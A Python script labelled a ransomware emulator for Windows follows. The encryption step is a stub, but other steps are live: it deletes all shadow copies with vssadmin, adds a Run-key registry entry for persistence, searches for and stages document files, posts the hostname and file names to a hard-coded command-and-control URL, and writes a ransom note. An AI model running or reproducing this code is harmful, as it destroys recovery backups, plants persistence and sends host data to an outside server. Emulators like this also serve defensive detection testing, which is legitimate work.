import os
import time
import random
import string
import winreg
import subprocess
import requests
import ctypes
import sys
import shutil

C2_SERVER_URL = "http://ransomware-c2-server-91k2d.com"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def generate_random_extension(length=4):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def delete_shadow_copies():
    if not is_admin():
        print("[-] Skipping shadow copy deletion (requires admin rights).")
        return
    print("\n[+] Deleting shadow copies...")
    try:
        subprocess.run("vssadmin.exe delete shadows /all /quiet", shell=True, check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Shadow copies deleted.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[-] Failed to delete shadow copies.")

def create_persistence(script_path, key_name):
    print("[+] Creating persistence registry entry...")
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
        print(f"[+] Persistence key '{key_name}' created.")
    except Exception as e:
        print(f"[-] Failed to create persistence: {e}")

def create_dummy_files():
    print("[+] Creating dummy files...")
    files = {
        "report_Q4.docx": "confidential data",
        "budget_2025.xlsx": "financials",
        "meeting_notes.txt": "secret plans"
    }
    for name, content in files.items():
        with open(name, "w") as f:
            f.write(content)
    print("[+] Dummy files created.")

def emulate_encryption(encrypted_extension):
    print(f"\n[+] Encrypting files with extension {encrypted_extension}...")
    # Example encryption logic – could reverse content, rename files, etc.
    print("[+] Encryption emulation complete.")

def simulate_c2_checkin(ransom_id):
    print(f"[+] Simulating C2 check-in with ID: {ransom_id}")
    try:
        data = {
            'id': ransom_id,
            'hostname': os.environ.get('COMPUTERNAME', 'unknown'),
            'status': 'infection_started'
        }
        requests.post(f"{C2_SERVER_URL}/checkin", json=data, timeout=2)
    except requests.exceptions.RequestException:
        print("[-] C2 check-in failed (as expected).")

def find_sensitive_files(search_path='.'):
    print(f"[+] Searching for sensitive files in {os.path.abspath(search_path)}...")
    extensions = ('.docx', '.xlsx', '.pdf', '.txt')
    found = []
    for root, _, files in os.walk(search_path):
        for file in files:
            if file.endswith(extensions) and "DECRYPT_INSTRUCTIONS" not in file:
                found.append(os.path.join(root, file))
    print(f"[+] {len(found)} sensitive files found.")
    return found

def stage_files_for_exfiltration(file_list, ransom_id):
    staging_dir = os.path.join(os.environ['TEMP'], f"stage_{ransom_id}")
    print(f"[+] Staging files at {staging_dir}...")
    try:
        os.makedirs(staging_dir, exist_ok=True)
        for file_path in file_list:
            shutil.copy(file_path, staging_dir)
        print("[+] Files staged successfully.")
        return staging_dir
    except Exception as e:
        print(f"[-] Failed to stage files: {e}")
        return None

def simulate_data_exfiltration(staging_dir, ransom_id):
    print(f"[+] Simulating data exfiltration from {staging_dir}...")
    try:
        files = os.listdir(staging_dir)
        data = {'id': ransom_id, 'exfiltrated_files': files}
        requests.post(f"{C2_SERVER_URL}/upload", json=data, timeout=3)
    except requests.exceptions.RequestException:
        print("[-] Data exfiltration failed (as expected).")

def main():
    print("--- Ransomware Emulator ---")
    print(f"[+] Admin Privileges: {'Yes' if is_admin() else 'No'}")

    ransom_id = generate_random_extension()

    simulate_c2_checkin(ransom_id)
    create_dummy_files()
    files = find_sensitive_files()
    staging_dir = stage_files_for_exfiltration(files, ransom_id)

    if staging_dir:
        simulate_data_exfiltration(staging_dir, ransom_id)
        shutil.rmtree(staging_dir)
        print("[+] Staging directory cleaned.")

    create_persistence(os.path.abspath(sys.argv[0]), "SysSvc_" + ransom_id)
    delete_shadow_copies()
    emulate_encryption("." + ransom_id)

    with open(f"DECRYPT_INSTRUCTIONS_{ransom_id}.txt", "w") as f:
        f.write(f"Your files are encrypted. Recovery ID: {ransom_id}")
    print(f"[+] Ransom note created: DECRYPT_INSTRUCTIONS_{ransom_id}.txt")

    print("\n--- Simulation Finished ---")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
